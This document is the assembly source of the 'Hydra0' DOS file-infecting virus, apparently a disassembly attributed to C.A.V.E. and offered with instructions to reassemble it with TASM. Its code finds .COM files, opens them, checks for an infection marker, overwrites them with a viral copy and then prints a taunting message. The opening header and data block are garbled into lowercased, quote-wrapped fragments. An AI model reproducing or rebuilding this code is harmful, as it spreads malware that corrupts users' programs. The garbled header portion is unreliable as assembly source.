

  
PAGE  59,132
  
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ								         ÛÛ
;ÛÛ			        HYDRA0				         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ  Disassembly by: -=>Wasp<=- aka="">>Night Crawler< ûû="" ;ûû="" ûû="" ;ûû="" reassemble="" with="" tasm="" 2.0="" ûû="" ;ûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûû="" data_1e="" equ="" 80h="" data_18e="" equ="" 2e0h="" data_19e="" equ="" 2e3h="" seg_a="" segment="" byte="" public="" assume="" cs:seg_a,="" ds:seg_a="" org="" 100h="" hydra0="" proc="" far="" start:="" jmp="" loc_1="" ;="" (0225)="" db="" 59h,="" 44h,="" 00h,="" 00h="" data_4="" db="" 'hydra="" beta="" -="" not="" for="" release'="" db="" '.="" *.co?'="" db="" 0="" data_7="" dw="" 0,="" 84fch="" data_9="" dw="" 0="" data_10="" db="" 0="" db="" 29="" dup="" (0)="" data_11="" db="" 0="" db="" 13="" dup="" (0)="" copyright="" db="" 'copyright="" (c)'="" data_12="" db="" '="" 1991="" by="" c.a.v.e.="" hydra$'="" db="" 'watch="" for="" the="" many="" heads.',="" 0dh,="" 0ah="" db="" 0dh,="" 0ah,="" 0dh,="" 0ah,="" 0dh,="" 0ah,="" 0dh="" db="" 0ah,="" 0dh,="" 0ah,="" 0dh,="" 0ah,="" 'the="" fir'="" db="" 'st="" eight="" are="" easy="" to="" find="" and="" ki'="" db="" 'll.',="" 0dh,="" 0ah,="" 0dh,="" 0ah,="" 'their'="" db="" '="" replacements="" will="" be="" more="" sophi'="" db="" 'sticated.$'="" db="" '(c)="" 1991="" -="" c.="" a.="" v.="" e.$'="" loc_1:="" push="" ax="" mov="" ax,cs="" add="" ax,1000h="" xor="" di,di="" ;="" zero="" register="" mov="" cx,2e0h="" mov="" si,offset="" ds:[100h]="" mov="" es,ax="" rep="" movsb="" ;="" rep="" when="" cx="">0 Mov [si] to es:[di]
		MOV	AH,1AH
		MOV	DX,OFFSET DATA_10
		INT	21H			; DOS Services  ah=function 1Ah
						;  set DTA to ds:dx
		MOV	AH,4EH			; 'N'
		MOV	DX,OFFSET DATA_4+22H
		INT	21H			; DOS Services  ah=function 4Eh
						;  find 1st filenam match @ds:dx
		JC	LOC_5			; Jump if carry Set
LOC_2:
		MOV	AH,3DH			; '='
		MOV	AL,2
		MOV	DX,OFFSET DATA_11
		MOV	AL,2
		INT	21H			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		MOV	BX,AX
		PUSH	ES
		POP	DS
		MOV	AX,3F00H
		MOV	CX,0FFFFH
		MOV	DX,DATA_18E
		INT	21H			; DOS Services  ah=function 3Fh
						;  read file, cx=bytes, to ds:dx
		ADD	AX,2E0H
		MOV	CS:DATA_9,AX
		CMP	WORD PTR DS:DATA_19E,4459H
		JNE	LOC_3			; Jump if not equal
		MOV	AH,3EH			; '>'
		INT	21H			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		PUSH	CS
		POP	DS
		MOV	AH,4FH			; 'O'
		INT	21H			; DOS Services  ah=function 4Fh
						;  find next filename match
		JC	LOC_6			; Jump if carry Set
		JMP	SHORT LOC_2		; (0247)
LOC_3:
		XOR	CX,CX			; Zero register
		MOV	DX,CX
		MOV	AX,4200H
		INT	21H			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		JC	LOC_4			; Jump if carry Set
		MOV	AH,40H			; '@'
		XOR	DX,DX			; Zero register
		MOV	CX,CS:DATA_9
		INT	21H			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
LOC_4:
		MOV	AH,3EH			; '>'
		INT	21H			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		PUSH	CS
		POP	DS
LOC_5:
		MOV	AH,1AH
		MOV	DX,DATA_1E
		INT	21H			; DOS Services  ah=function 1Ah
						;  set DTA to ds:dx
		JMP	SHORT LOC_7		; (02F0)
		DB	90H
LOC_6:
		PUSH	DX
		XOR	AX,AX			; Zero register
		MOV	AX,0F00H
		INT	10H			; Video display   ah=functn 0Fh
						;  get state, al=mode, bh=page
		MOV	AH,0
		INT	10H			; Video display   ah=functn 00h
						;  set display mode in al
		MOV	AX,200H
		MOV	DH,6
		MOV	DL,25H			; '%'
		INT	10H			; Video display   ah=functn 02h
						;  set cursor location in dx
		XOR	DX,DX			; Zero register
		MOV	DX,OFFSET DATA_12+14H
		MOV	AH,9
		INT	21H			; DOS Services  ah=function 09h
						;  display char string at ds:dx
		MOV	AX,200H
		MOV	DH,0BH
		MOV	DL,1BH
		INT	10H			; Video display   ah=functn 02h
						;  set cursor location in dx
		MOV	DX,OFFSET DATA_12+1AH
		MOV	AH,9
		INT	21H			; DOS Services  ah=function 09h
						;  display char string at ds:dx
		MOV	AX,200H
		MOV	DH,17H
		MOV	DL,0
		INT	10H			; Video display   ah=functn 02h
						;  set cursor location in dx
		MOV	DX,OFFSET DATA_12+9EH
		MOV	AH,9
		INT	21H			; DOS Services  ah=function 09h
						;  display char string at ds:dx
		MOV	AX,200H
		MOV	DH,18H
		MOV	DL,0
		INT	10H			; Video display   ah=functn 02h
						;  set cursor location in dx
		MOV	AX,4C00H
		INT	21H			; DOS Services  ah=function 4Ch
						;  terminate with al=return code
LOC_7:
		XOR	DI,DI			; Zero register
		MOV	SI,OFFSET DATA_16
		MOV	CX,0D3H
		REP	MOVSB			; Rep when cx >0 Mov [si] to es:[di]
		POP	BX
		MOV	CS:DATA_7,0
		MOV	WORD PTR CS:DATA_7+2,ES
		POP	BX
		JMP	DWORD PTR CS:DATA_7
DATA_16		DB	1EH
		DB	 07H,0B9H,0FFH,0FFH,0BEH,0E0H
		DB	 03H,0BFH, 00H, 01H, 2BH,0CEH
		DB	0F3H,0A4H, 2EH,0C7H, 06H, 00H
		DB	 01H, 00H, 01H, 2EH, 8CH, 1EH
		DB	 02H, 01H, 8BH,0C3H, 2EH,0FFH
		DB	 2EH, 00H, 01H
		DB	'  Coalition  of   American  Viru'
		DB	's   Engineers         -=-=-     '
		DB	'  Dedicated  to  supporting  the'
		DB	'   anti-virus    industry withou'
		DB	't recognition or reward.        '
		DB	'      -=-=-      '
		DB	0CDH, 20H
  
HYDRA0		ENDP
  
SEG_A		ENDS
  
  
  
		END	START

</=->